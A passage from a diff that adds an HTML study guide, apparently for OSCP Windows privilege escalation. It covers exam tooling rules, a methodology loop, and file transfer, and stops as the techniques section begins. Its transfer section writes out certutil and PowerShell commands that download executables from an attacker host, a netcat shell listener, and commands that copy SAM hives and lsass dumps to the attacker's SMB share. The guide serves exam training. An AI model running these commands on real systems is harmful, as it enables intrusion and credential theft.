@@ -1,0 +1,824 @@
+<!doctype html><html><head><meta charset=utf8><meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover"><style>:root{color-scheme:light;box-sizing:border-box;padding-top:env(safe-area-inset-top,0px);padding-bottom:env(safe-area-inset-bottom,0px)}html{scroll-padding-top:env(safe-area-inset-top,0px)}body{margin:0;padding:0;font:14px -apple-system,BlinkMacSystemFont,sans-serif;background:#fff;color:#000}img{max-width:100%}[hidden]:not([hidden=until-found i]){display:none!important}</style></head><body>
+<title>Climb to SYSTEM</title>
+<meta name="description" content="An exam-grade, interactive field manual for Windows privilege escalation on the OSCP.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=IBM+Plex+Sans:wght@400;500;600;700&family=IBM+Plex+Sans+Condensed:wght@600;700&display=swap">
+<style>
+/* ============ TOKENS ============ */
+:root{
+  --bg:#eef1f6;--bg-2:#ffffff;--bg-raise:#f7f9fc;
+  --term:#0c1119;--term-text:#dbe6f0;
+  --border:#d3dae4;--border-strong:#b9c3d0;
+  --text:#141c28;--text-dim:#4f5c6e;--text-faint:#7c8a9c;
+  --gold:#c98a12;--gold-fill:#e8a72c;--gold-soft:rgba(224,167,44,0.14);--gold-ink:#8a5c07;
+  --cyan:#0e7f9e;--cyan-soft:rgba(14,127,158,0.10);
+  --red:#c8412f;--red-soft:rgba(200,65,47,0.10);
+  --green:#1f9d57;--green-soft:rgba(31,157,87,0.12);
+  --il-low:#7b8794;--il-med:#0e7f9e;--il-high:#c98a12;--il-sys:#d8a52a;
+  --shadow:0 1px 2px rgba(20,28,40,.06),0 6px 20px rgba(20,28,40,.08);
+  --shadow-lift:0 2px 6px rgba(20,28,40,.10),0 18px 44px rgba(20,28,40,.14);
+  --mono:"IBM Plex Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:"IBM Plex Sans",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+  --cond:"IBM Plex Sans Condensed","IBM Plex Sans",system-ui,sans-serif;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0d131c;--bg-2:#141d28;--bg-raise:#182231;--term:#080c12;--term-text:#dbe6f0;
+  --border:#25313f;--border-strong:#33414f;--text:#e7edf3;--text-dim:#9caabb;--text-faint:#65727f;
+  --gold:#f5b53d;--gold-fill:#f5b53d;--gold-soft:rgba(245,181,61,0.13);--gold-ink:#f5c165;
+  --cyan:#58c7e0;--cyan-soft:rgba(88,199,224,0.12);--red:#ff7264;--red-soft:rgba(255,114,100,0.12);
+  --green:#5fd08a;--green-soft:rgba(95,208,138,0.14);
+  --il-low:#6b7684;--il-med:#58c7e0;--il-high:#f5b53d;--il-sys:#ffd873;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 8px 26px rgba(0,0,0,.42);
+  --shadow-lift:0 2px 6px rgba(0,0,0,.5),0 22px 50px rgba(0,0,0,.55);
+}}
+:root[data-theme="dark"]{
+  --bg:#0d131c;--bg-2:#141d28;--bg-raise:#182231;--term:#080c12;--term-text:#dbe6f0;
+  --border:#25313f;--border-strong:#33414f;--text:#e7edf3;--text-dim:#9caabb;--text-faint:#65727f;
+  --gold:#f5b53d;--gold-fill:#f5b53d;--gold-soft:rgba(245,181,61,0.13);--gold-ink:#f5c165;
+  --cyan:#58c7e0;--cyan-soft:rgba(88,199,224,0.12);--red:#ff7264;--red-soft:rgba(255,114,100,0.12);
+  --green:#5fd08a;--green-soft:rgba(95,208,138,0.14);
+  --il-low:#6b7684;--il-med:#58c7e0;--il-high:#f5b53d;--il-sys:#ffd873;
+  --shadow:0 1px 2px rgba(0,0,0,.4),0 8px 26px rgba(0,0,0,.42);
+  --shadow-lift:0 2px 6px rgba(0,0,0,.5),0 22px 50px rgba(0,0,0,.55);
+}
+
+/* ============ BASE ============ */
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);line-height:1.6;-webkit-font-smoothing:antialiased}
+.wrap{max-width:1120px;margin:0 auto;padding:0 22px}
+h1,h2,h3{margin:0;text-wrap:balance;line-height:1.12}
+p{margin:0}
+a{color:var(--cyan);text-decoration:none}
+a:hover{text-decoration:underline}
+code{font-family:var(--mono);font-size:.9em;background:var(--bg-raise);border:1px solid var(--border);border-radius:5px;padding:1px 5px}
+::selection{background:var(--gold-soft)}
+:focus-visible{outline:2px solid var(--cyan);outline-offset:2px;border-radius:4px}
+.mono{font-family:var(--mono)}
+.eyebrow{font-family:var(--mono);font-size:11.5px;font-weight:600;letter-spacing:.18em;text-transform:uppercase;color:var(--gold)}
+
+/* ============ TOP BAR ============ */
+.topbar{position:sticky;top:0;z-index:50;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
+.topbar .row{display:flex;align-items:center;gap:14px;height:54px}
+.brand{display:flex;align-items:center;gap:10px;font-family:var(--mono);font-weight:600;font-size:15px}
+.brand .prompt{color:var(--gold)}
+.brand .caret{color:var(--cyan);animation:blink 1.15s step-end infinite}
+@keyframes blink{50%{opacity:0}}
+.spacer{flex:1}
+.tag{font-family:var(--mono);font-size:11px;letter-spacing:.1em;text-transform:uppercase;color:var(--text-dim);border:1px solid var(--border);border-radius:100px;padding:4px 10px}
+.tbtn{display:inline-flex;align-items:center;gap:7px;cursor:pointer;background:var(--bg-2);border:1px solid var(--border);color:var(--text-dim);border-radius:9px;padding:7px 11px;font-family:var(--mono);font-size:12px;font-weight:500}
+.tbtn:hover{border-color:var(--border-strong);color:var(--text)}
+
+/* ============ JUMP NAV ============ */
+.jnav{position:sticky;top:54px;z-index:45;background:color-mix(in srgb,var(--bg) 92%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--border)}
+.jnav .row{display:flex;gap:4px;overflow-x:auto;padding:9px 0;scrollbar-width:thin}
+.jnav a{font-family:var(--mono);font-size:12px;color:var(--text-dim);padding:6px 11px;border-radius:8px;white-space:nowrap;border:1px solid transparent}
+.jnav a:hover{text-decoration:none;color:var(--text);background:var(--bg-raise);border-color:var(--border)}
+
+/* ============ HERO ============ */
+.hero{padding:46px 0 26px}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:40px;align-items:center}
+.hero h1{font-family:var(--cond);font-weight:700;font-size:clamp(36px,6vw,58px);letter-spacing:-.01em;margin:14px 0 0}
+.hero h1 .accent{color:var(--gold)}
+.lede{color:var(--text-dim);font-size:16.5px;margin-top:16px;max-width:54ch}
+.lede strong{color:var(--text);font-weight:600}
+.hero-cmd{margin-top:20px;font-family:var(--mono);font-size:13px;background:var(--term);color:var(--term-text);border:1px solid var(--border-strong);border-radius:10px;padding:12px 14px;display:inline-flex;gap:10px;align-items:center;box-shadow:var(--shadow);max-width:100%;overflow-x:auto}
+.hero-cmd .d{color:#8b98a6}
+
+.ladder-card{background:var(--bg-2);border:1px solid var(--border);border-radius:16px;padding:20px 20px 16px;box-shadow:var(--shadow-lift)}
+.ladder-card h3{font-family:var(--mono);font-size:12px;letter-spacing:.12em;text-transform:uppercase;color:var(--text-faint);font-weight:600;margin-bottom:6px}
+.rungs{display:flex;flex-direction:column-reverse;gap:8px;margin-top:12px}
+.rung{display:flex;align-items:center;gap:12px;padding:11px 13px;border-radius:11px;border:1px solid var(--border);background:var(--bg-raise);position:relative;transition:transform .5s ease,box-shadow .5s ease,border-color .5s ease}
+.rung .dot{width:11px;height:11px;border-radius:50%;flex:none;background:var(--rc);box-shadow:0 0 0 4px color-mix(in srgb,var(--rc) 20%,transparent)}
+.rung .lbl{font-family:var(--mono);font-size:13px;font-weight:600}
+.rung .sub{font-size:11.5px;color:var(--text-faint);margin-left:auto;font-family:var(--mono)}
+.rung[data-k="low"]{--rc:var(--il-low)}.rung[data-k="med"]{--rc:var(--il-med)}.rung[data-k="high"]{--rc:var(--il-high)}
+.rung[data-k="sys"]{--rc:var(--il-sys);border-color:color-mix(in srgb,var(--il-sys) 55%,var(--border))}
+.rung.lit{border-color:var(--rc);box-shadow:0 0 0 1px var(--rc),0 8px 24px color-mix(in srgb,var(--rc) 26%,transparent);transform:translateX(4px)}
+.rung .crown{margin-left:auto;color:var(--il-sys);font-size:14px}
+.you-here{font-family:var(--mono);font-size:10.5px;letter-spacing:.08em;text-transform:uppercase;color:var(--bg);background:var(--il-low);border-radius:5px;padding:2px 7px;margin-left:auto;font-weight:600}
+.climb-arrow{text-align:center;color:var(--text-faint);font-size:12px;font-family:var(--mono);margin:10px 0 2px;letter-spacing:.1em}
+
+/* ============ EXAM RULES STRIP ============ */
+.rules{background:var(--gold-soft);border:1px solid color-mix(in srgb,var(--gold) 38%,var(--border));border-radius:14px;padding:16px 18px;display:grid;grid-template-columns:auto 1fr;gap:14px;align-items:start}
+.rules .ico{font-size:22px;line-height:1}
+.rules h3{font-family:var(--mono);font-size:13px;letter-spacing:.04em;margin-bottom:8px;color:var(--gold-ink)}
+.rules ul{margin:0;padding-left:0;list-style:none;display:grid;gap:7px}
+.rules li{font-size:13.5px;color:var(--text-dim);padding-left:20px;position:relative}
+.rules li::before{content:"▸";position:absolute;left:0;color:var(--gold)}
+.rules li b{color:var(--text)}
+.ok{color:var(--green);font-weight:600}.no{color:var(--red);font-weight:600}
+
+/* ============ SECTIONS ============ */
+section{padding:42px 0;scroll-margin-top:108px}
+.sec-head{display:flex;flex-direction:column;gap:8px;margin-bottom:24px}
+.sec-head h2{font-family:var(--cond);font-weight:700;font-size:clamp(25px,4vw,36px);letter-spacing:-.01em}
+.sec-head p{color:var(--text-dim);max-width:66ch;font-size:15.5px}
+.divider{height:1px;background:linear-gradient(90deg,var(--border),transparent)}
+
+/* methodology loop */
+.loop{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;position:relative}
+.loop-step{background:var(--bg-2);border:1px solid var(--border);border-radius:14px;padding:18px 16px;position:relative;box-shadow:var(--shadow)}
+.loop-step .n{font-family:var(--mono);font-size:11px;font-weight:700;color:var(--gold);border:1px solid var(--gold);border-radius:7px;width:26px;height:26px;display:grid;place-items:center;margin-bottom:12px}
+.loop-step h4{margin:0 0 5px;font-size:15px;font-family:var(--mono);font-weight:600}
+.loop-step p{font-size:13px;color:var(--text-dim)}
+.loop-step.active{border-color:var(--gold);box-shadow:0 0 0 1px var(--gold),var(--shadow)}
+.loop-step .arrow{position:absolute;right:-11px;top:50%;transform:translateY(-50%);color:var(--text-faint);z-index:2;font-size:16px}
+.loop-step:last-child .arrow{display:none}
+.loop-note{margin-top:18px;font-size:14px;color:var(--text-dim);border-left:3px solid var(--gold);padding:8px 14px 8px 15px;background:var(--gold-soft);border-radius:0 8px 8px 0}
+.loop-note b{color:var(--text)}
+
+/* ============ MINDMAP ============ */
+.map-wrap{background:radial-gradient(120% 90% at 50% 0%,var(--bg-raise),var(--bg-2));border:1px solid var(--border);border-radius:18px;padding:8px;box-shadow:var(--shadow);overflow-x:auto}
+.map-inner{min-width:680px}
+svg.map{width:100%;height:auto;display:block}
+.map .edge{stroke:var(--border-strong);stroke-width:2;fill:none;transition:stroke .25s}
+.node{cursor:pointer}
+.node .chip{transition:transform .2s ease,filter .2s ease}
+.node text{font-family:var(--mono);font-weight:600;pointer-events:none}
+.node:hover .chip,.node:focus-visible .chip{transform:scale(1.05);filter:brightness(1.08)}
+.node.dim{opacity:.4}
+.center-chip{filter:drop-shadow(0 6px 16px color-mix(in srgb,var(--gold) 40%,transparent))}
+.map-legend{display:flex;gap:16px;flex-wrap:wrap;margin-top:14px;font-family:var(--mono);font-size:11.5px;color:var(--text-faint)}
+.map-legend span{display:inline-flex;align-items:center;gap:6px}
+.map-legend i{width:10px;height:10px;border-radius:3px;display:inline-block}
+
+/* ============ TOOLBAR (search + controls) ============ */
+.toolbar{display:flex;gap:12px;align-items:center;margin-bottom:18px;flex-wrap:wrap}
+.search{flex:1;min-width:220px;position:relative}
+.search input{width:100%;font-family:var(--mono);font-size:13.5px;color:var(--text);background:var(--bg-2);border:1px solid var(--border);border-radius:10px;padding:11px 14px 11px 38px}
+.search input::placeholder{color:var(--text-faint)}
+.search input:focus{outline:none;border-color:var(--cyan);box-shadow:0 0 0 3px var(--cyan-soft)}
+.search .mag{position:absolute;left:13px;top:50%;transform:translateY(-50%);color:var(--text-faint);font-size:14px;pointer-events:none}
+.search .clr{position:absolute;right:10px;top:50%;transform:translateY(-50%);cursor:pointer;color:var(--text-faint);font-size:14px;display:none}
+.mini{font-family:var(--mono);font-size:12px;font-weight:500;cursor:pointer;background:var(--bg-2);border:1px solid var(--border);color:var(--text-dim);border-radius:9px;padding:10px 13px}
+.mini:hover{color:var(--text);border-color:var(--border-strong)}
+.nohit{display:none;text-align:center;color:var(--text-faint);font-family:var(--mono);font-size:13px;padding:24px}
+
+/* progress */
+.progress-bar{display:flex;align-items:center;gap:14px;margin:0 0 18px}
+.pb-track{flex:1;height:9px;border-radius:100px;background:var(--bg-raise);border:1px solid var(--border);overflow:hidden}
+.pb-fill{height:100%;width:0;background:linear-gradient(90deg,var(--il-med),var(--gold-fill));border-radius:100px;transition:width .5s ease}
+.pb-label{font-family:var(--mono);font-size:12.5px;color:var(--text-dim);white-space:nowrap}
+.pb-label b{color:var(--gold)}
+
+/* ============ TECHNIQUE CARDS ============ */
+.cards{display:flex;flex-direction:column;gap:13px}
+.card{background:var(--bg-2);border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow);overflow:hidden;scroll-margin-top:118px;transition:border-color .3s,box-shadow .3s}
+.card.flash{border-color:var(--gold);box-shadow:0 0 0 2px var(--gold-soft),var(--shadow-lift)}
+.card-head{display:flex;align-items:center;gap:14px;padding:16px 18px;cursor:pointer;user-select:none}
+.card-head .idx{font-family:var(--mono);font-size:12px;color:var(--text-faint);font-weight:600;width:24px;flex:none}
+.card-head .ttl{font-size:16.5px;font-weight:600;flex:1;min-width:0}
+.card-head .ttl small{display:block;font-family:var(--mono);font-size:11.5px;color:var(--text-dim);font-weight:500;margin-top:2px}
+.badges{display:flex;gap:6px;flex-wrap:wrap;justify-content:flex-end;max-width:360px}
+.badge{font-family:var(--mono);font-size:10.5px;font-weight:600;letter-spacing:.03em;border-radius:6px;padding:3px 8px;border:1px solid var(--border);color:var(--text-dim);white-space:nowrap}
+.badge.prereq{color:var(--gold-ink);border-color:color-mix(in srgb,var(--gold) 45%,var(--border));background:var(--gold-soft)}
+.badge.diff-easy{color:var(--green);border-color:color-mix(in srgb,var(--green) 40%,var(--border));background:var(--green-soft)}
+.badge.diff-med{color:var(--cyan);border-color:color-mix(in srgb,var(--cyan) 40%,var(--border));background:var(--cyan-soft)}
+.badge.diff-hard{color:var(--red);border-color:color-mix(in srgb,var(--red) 40%,var(--border));background:var(--red-soft)}
+.chev{flex:none;color:var(--text-faint);transition:transform .3s ease}
+.card.open .chev{transform:rotate(90deg)}
+.card-body{display:none;padding:2px 18px 20px;border-top:1px solid var(--border)}
+.card.open .card-body{display:block;animation:reveal .3s ease}
+@keyframes reveal{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:none}}
+.block{margin-top:16px}
+.block .k{font-family:var(--mono);font-size:11px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;display:inline-flex;align-items:center;gap:7px;margin-bottom:8px}
+.block.why .k{color:var(--cyan)}
+.block.spot .k{color:var(--gold)}
+.block.pop .k{color:var(--red)}
+.block.oscp .k{color:var(--green)}
+.block.watch .k{color:var(--text-dim)}
+.block p{font-size:14.5px;color:var(--text-dim)}
+.block p b{color:var(--text)}
+.analogy{background:var(--cyan-soft);border-radius:10px;padding:12px 14px;font-size:14.5px;color:var(--text);border:1px solid color-mix(in srgb,var(--cyan) 22%,var(--border))}
+.analogy b{color:var(--cyan)}
+.watch-note{font-size:13.5px;color:var(--text-dim);background:var(--bg-raise);border:1px dashed var(--border-strong);border-radius:10px;padding:11px 13px}
+.watch-note b{color:var(--red)}
+.oscp-note{font-size:13.5px;color:var(--text-dim);background:var(--green-soft);border:1px solid color-mix(in srgb,var(--green) 28%,var(--border));border-radius:10px;padding:11px 13px}
+.oscp-note b{color:var(--green)}
+.way{margin-top:12px}
+.way-h{font-family:var(--mono);font-size:12.5px;font-weight:600;color:var(--text);display:flex;align-items:baseline;gap:9px;margin-bottom:5px}
+.way-h .wtag{font-size:10px;color:var(--red);border:1px solid color-mix(in srgb,var(--red) 40%,var(--border));border-radius:5px;padding:1px 6px;letter-spacing:.04em;flex:none}
+.way-note{font-size:13px;color:var(--text-dim);margin:0 0 7px}
+.way-note b{color:var(--text)}
+
+/* terminal command block */
+.term{position:relative;background:var(--term);border:1px solid var(--border-strong);border-radius:10px;margin-top:8px;overflow:hidden}
+.term-top{display:flex;align-items:center;gap:7px;padding:7px 12px;border-bottom:1px solid rgba(255,255,255,.07)}
+.term-top .dots{display:flex;gap:5px}
+.term-top .dots i{width:9px;height:9px;border-radius:50%}
+.term-top .dots i:nth-child(1){background:#ff5f56}.term-top .dots i:nth-child(2){background:#ffbd2e}.term-top .dots i:nth-child(3){background:#27c93f}
+.term-top .name{font-family:var(--mono);font-size:11px;color:#8b98a6;margin-left:4px}
+.copy{margin-left:auto;font-family:var(--mono);font-size:11px;cursor:pointer;color:#8b98a6;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);border-radius:6px;padding:3px 9px}
+.copy:hover{color:#dbe6f0;background:rgba(255,255,255,.1)}
+.copy.done{color:#66d19e;border-color:#66d19e}
+.term pre{margin:0;padding:12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;line-height:1.75;color:var(--term-text);white-space:pre}
+.term pre .cmt{color:#7f8b98}.term pre .fn{color:#f5b53d}.term pre .fl{color:#5cc7e0}.term pre .str{color:#66d19e}
+.got{margin-top:18px;display:flex;align-items:center;gap:10px}
+.got button{font-family:var(--mono);font-size:12.5px;font-weight:600;cursor:pointer;border:1px solid var(--border-strong);background:var(--bg-raise);color:var(--text-dim);border-radius:9px;padding:8px 14px;display:inline-flex;align-items:center;gap:8px;transition:all .2s}
+.got button:hover{color:var(--text);border-color:var(--gold)}
+.got button.on{background:var(--green-soft);border-color:var(--green);color:var(--green)}
+.got .check{width:16px;height:16px;border-radius:5px;border:1.5px solid currentColor;display:grid;place-items:center;font-size:11px}
+
+/* ============ TABLE ============ */
+.tbl-wrap{overflow-x:auto;border:1px solid var(--border);border-radius:14px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;min-width:540px;font-size:13.5px}
+th,td{text-align:left;padding:11px 15px;border-bottom:1px solid var(--border);vertical-align:top}
+thead th{font-family:var(--mono);font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--text-faint);font-weight:600;background:var(--bg-raise)}
+tbody tr:last-child td{border-bottom:none}
+td.mono,th.mono{font-family:var(--mono)}
+td .priv{font-family:var(--mono);color:var(--gold);font-weight:600;font-size:13px}
+tbody tr:hover{background:var(--bg-raise)}
+.ynY{color:var(--green);font-weight:600}.ynN{color:var(--red)}.ynP{color:var(--gold)}
+
+/* ============ GRID SECTIONS ============ */
+.cols2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.col-h{font-family:var(--mono);font-size:12px;letter-spacing:.06em;text-transform:uppercase;color:var(--text-faint);margin:0 0 8px;font-weight:600}
+.panel{background:var(--bg-2);border:1px solid var(--border);border-radius:13px;padding:16px 17px;box-shadow:var(--shadow)}
+.panel h4{margin:0 0 4px;font-size:15px}
+.panel p{font-size:13.5px;color:var(--text-dim)}
+
+/* rabbit holes */
+.holes{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.hole{background:var(--bg-2);border:1px solid var(--border);border-radius:13px;padding:16px 17px;box-shadow:var(--shadow)}
+.hole .h{display:flex;align-items:center;gap:9px;font-weight:600;font-size:14.5px;margin-bottom:6px}
+.hole .h .sig{font-size:16px}
+.hole p{font-size:13.5px;color:var(--text-dim)}
+.hole p b{color:var(--text)}
+
+/* ============ FOOTER ============ */
+footer{border-top:1px solid var(--border);padding:34px 0 46px;margin-top:20px}
+.foot-grid{display:flex;justify-content:space-between;gap:24px;flex-wrap:wrap;align-items:flex-start}
+.foot-note{font-size:12.5px;color:var(--text-faint);max-width:44ch}
+.foot-note b{color:var(--text-dim)}
+.scope{font-family:var(--mono);font-size:11.5px;color:var(--text-dim);border:1px solid var(--border);border-radius:10px;padding:11px 14px;background:var(--bg-2);display:flex;gap:10px;align-items:flex-start;max-width:430px}
+.scope .lk{color:var(--gold)}
+.srcs{font-family:var(--mono);font-size:11px;color:var(--text-faint);margin-top:8px}
+.srcs a{color:var(--text-dim)}
+
+/* ============ RESPONSIVE ============ */
+@media (max-width:860px){
+  .hero-grid{grid-template-columns:1fr;gap:30px}
+  .loop{grid-template-columns:1fr 1fr}.loop-step:nth-child(2) .arrow{display:none}
+  .cols2,.holes{grid-template-columns:1fr}
+  .rules{grid-template-columns:1fr}
+  .badges{display:none}
+}
+@media (max-width:520px){.loop{grid-template-columns:1fr}.loop-step .arrow{display:none}}
+@media (prefers-reduced-motion:reduce){*{animation:none!important;transition:none!important}}
+</style>
+
+<div class="topbar">
+  <div class="wrap row">
+    <div class="brand"><span class="prompt">PS</span> C:\climb<span class="caret">&gt;_</span></div>
+    <div class="spacer"></div>
+    <span class="tag">OSCP Field Manual</span>
+    <button class="tbtn" id="theme" aria-label="Toggle light and dark theme"><span id="theme-ico">◐</span> <span id="theme-txt">Theme</span></button>
+  </div>
+</div>
+<nav class="jnav"><div class="wrap row">
+  <a href="#method">Method</a><a href="#map">Map</a><a href="#transfer">Get tools on</a>
+  <a href="#techniques">Techniques</a><a href="#privs">Privileges</a><a href="#payloads">Payloads</a>
+  <a href="#proof">Proof</a><a href="#traps">Traps</a>
+</div></nav>
+
+<!-- ============ HERO ============ -->
+<header class="hero">
+  <div class="wrap hero-grid">
+    <div>
+      <span class="eyebrow">Windows Local Privilege Escalation · OSCP</span>
+      <h1>You've got a shell.<br>Now <span class="accent">climb to SYSTEM.</span></h1>
+      <p class="lede">You land on a Windows box as a <strong>weak user</strong> — a service account, a low login. Privilege escalation is the climb up to <strong>NT AUTHORITY\SYSTEM</strong>, the account that owns the machine. This is your field manual: the method, the mindmap, and every ladder with <strong>real commands and the variations</strong> to reach for when the first one fails.</p>
+      <div class="hero-cmd mono"><span class="d">C:\&gt;</span> whoami /priv&nbsp;&nbsp;<span class="d">:: the single highest-value command — start here</span></div>
+    </div>
+    <div class="ladder-card" aria-label="Windows privilege ladder">
+      <h3>The ladder you're climbing</h3>
+      <div class="rungs" id="rungs">
+        <div class="rung" data-k="low"><span class="dot"></span><span class="lbl">Service / low user</span><span class="you-here">you are here</span></div>
+        <div class="rung" data-k="med"><span class="dot"></span><span class="lbl">Standard user</span><span class="sub">Medium IL</span></div>
+        <div class="rung" data-k="high"><span class="dot"></span><span class="lbl">Administrator</span><span class="sub">High IL · UAC</span></div>
+        <div class="rung" data-k="sys"><span class="dot"></span><span class="lbl">NT AUTHORITY\SYSTEM</span><span class="crown">♔ goal</span></div>
+      </div>
+      <div class="climb-arrow">▲ &nbsp;higher = more power&nbsp; ▲</div>
+    </div>
+  </div>
+</header>
+
+<div class="wrap">
+  <div class="rules">
+    <div class="ico">⚖️</div>
+    <div>
+      <h3>EXAM TOOLING RULES — read once, don't lose points</h3>
+      <ul>
+        <li><span class="ok">Allowed on every target:</span> manual exploitation, <b>msfvenom</b> (payload generation), <code>winPEAS</code> / <code>PowerUp</code> / <code>Seatbelt</code> / <code>SharpUp</code> (enumeration), the Potato exploits, public PoCs you run yourself, <code>nc</code>, <code>chisel</code>, <code>impacket</code>.</li>
+        <li><span class="no">Metasploit framework + Meterpreter:</span> one single machine of your choice, for the <b>whole exam</b>. Don't burn it on a privesc you could do by hand — save it for a genuinely stuck initial foothold.</li>
+        <li><span class="no">Banned:</span> automated exploitation &amp; mass scanners — <code>sqlmap</code>, Nessus/Nexpose, Burp Pro active scan, <code>db_autopwn</code>, any AI/auto-exploit tool.</li>
+        <li><b>Bottom line:</b> privilege escalation on OSCP is almost always done with the manual techniques below — enumeration scanners and msfvenom are fair game, so you rarely need Metasploit here at all.</li>
+      </ul>
+    </div>
+  </div>
+</div>
+
+<!-- ============ METHODOLOGY ============ -->
+<section id="method">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">The loop that never changes</span>
+      <h2>Escalation is a method, not a magic command</h2>
+      <p>Every box is different, but the process is always the same. Most people get stuck because they stop enumerating too early and jump to an exploit. Run the loop instead.</p>
+    </div>
+    <div class="loop">
+      <div class="loop-step" data-i="0"><div class="n">1</div><h4>Enumerate</h4><p>Everything: your privileges, services, tasks, files, registry, installed software. Coverage first — run winPEAS <em>and</em> read it.</p><span class="arrow">→</span></div>
+      <div class="loop-step" data-i="1"><div class="n">2</div><h4>Identify</h4><p>Which finding is the <em>intended</em> path? It's often a boring, medium-severity one. Rank your options; don't tunnel on the first.</p><span class="arrow">→</span></div>
+      <div class="loop-step" data-i="2"><div class="n">3</div><h4>Exploit</h4><p>Abuse the one misconfiguration to run code as a higher account. First way fails? There's almost always a second way.</p><span class="arrow">→</span></div>
+      <div class="loop-step" data-i="3"><div class="n">4</div><h4>Verify &amp; prove</h4><p><code>whoami</code> says SYSTEM? <b>Screenshot it now</b> — the exam is passed in the report, not the shell.</p></div>
+    </div>
+    <p class="loop-note"><b>Golden rule for beginners:</b> when you feel stuck, the question is never "what exploit do I try?" — it's <b>"what haven't I enumerated yet?"</b> The answer is almost always hiding in output you already have.</p>
+  </div>
+</section>
+
+<div class="wrap"><div class="divider"></div></div>
+
+<!-- ============ MINDMAP ============ -->
+<section id="map">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">The attack surface, mapped</span>
+      <h2>Where the ladders are</h2>
+      <p>From one command, the whole board opens up. Every branch is a way something runs as a higher account — or hands you its credentials. Tap any node to jump to how it works.</p>
+    </div>
+    <div class="map-wrap"><div class="map-inner">
+      <svg class="map" viewBox="0 0 900 480" role="img" aria-label="Mind map of Windows privilege escalation vectors branching from whoami /priv">
+        <g id="edges"></g><g id="nodes"></g>
+      </svg>
+    </div></div>
+    <div class="map-legend">
+      <span><i style="background:var(--gold-fill)"></i> abuse your token / privileges</span>
+      <span><i style="background:var(--cyan)"></i> hijack something that runs elevated</span>
+      <span><i style="background:var(--red)"></i> credentials, UAC &amp; last resort</span>
+      <span style="color:var(--text-dim)">tap a node ↓</span>
+    </div>
+  </div>
+</section>
+
+<!-- ============ GET TOOLS ON ============ -->
+<section id="transfer">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Before you can abuse anything</span>
+      <h2>Getting your tools onto the box</h2>
+      <p>winPEAS, PrintSpoofer, your payload — they live on your Kali box. Here's how to move them over, and how to send loot (SAM hives, dumps) back. Host a web or SMB server on your attack box first.</p>
+    </div>
+    <div class="cols2">
+      <div>
+        <div class="col-h">On Kali — serve the files</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">attacker.sh</span><button class="copy">copy</button></div>
+<pre><span class="cmt"># HTTP server in your tools folder</span>
+<span class="fn">python3</span> -m http.server 80
+<span class="cmt"># SMB server (great for two-way transfer)</span>
+<span class="fn">impacket-smbserver</span> share $(pwd) <span class="fl">-smb2support</span>
+<span class="cmt"># catch the shell</span>
+<span class="fn">rlwrap</span> nc <span class="fl">-lvnp</span> 443</pre></div>
+      </div>
+      <div>
+        <div class="col-h">On target — pull them down</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">download.cmd</span><button class="copy">copy</button></div>
+<pre><span class="cmt">:: certutil (lives on every Windows)</span>
+<span class="fn">certutil</span> -urlcache -split -f <span class="str">http://KALI/winPEAS.exe</span> p.exe
+<span class="cmt">:: PowerShell</span>
+<span class="fn">powershell</span> iwr <span class="str">http://KALI/p.exe</span> -o p.exe
+<span class="fn">powershell</span> "(New-Object Net.WebClient).DownloadFile('http://KALI/p.exe','p.exe')"
+<span class="cmt">:: SMB — run straight from the share</span>
+<span class="fn">copy</span> <span class="str">\\KALI\share\PrintSpoofer64.exe</span> .</pre></div>
+      </div>
+      <div>
+        <div class="col-h">Send loot back to Kali</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">exfil.cmd</span><button class="copy">copy</button></div>
+<pre><span class="cmt">:: copy hives / dumps to the SMB share</span>
+<span class="fn">copy</span> C:\temp\sam.hive <span class="str">\\KALI\share\</span>
+<span class="fn">copy</span> C:\temp\lsass.dmp <span class="str">\\KALI\share\</span></pre></div>
+      </div>
+      <div>
+        <div class="col-h">Nowhere to write? Use these</div>
+        <div class="term" data-copy><div class="term-top"><div class="dots"><i></i><i></i><i></i></div><span class="name">writable.cmd</span><button class="copy">copy</button></div>
+<pre><span class="cmt">:: world-writable staging dirs</span>
+C:\Windows\Temp      <span class="cmt">:: usually writable by all</span>
+C:\temp  &amp;  %TEMP%   <span class="cmt">:: your user's temp</span>
+<span class="cmt">:: find writable dirs with accesschk</span>
+<span class="fn">accesschk</span> <span class="fl">-uwdqs</span> Users c:\ /accepteula</pre></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ============ TECHNIQUE CARDS ============ -->
+<section id="techniques">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="eyebrow">Ten ladders, with the variations</span>
+      <h2>The techniques</h2>
+      <p>Each card: <b>why it works</b> (plain English), <b>how to spot it</b>, the <b>possible ways</b> to abuse it (first one fails — try the next), the <b>OSCP note</b>, and the <b>rabbit hole</b> to avoid.</p>
+    </div>
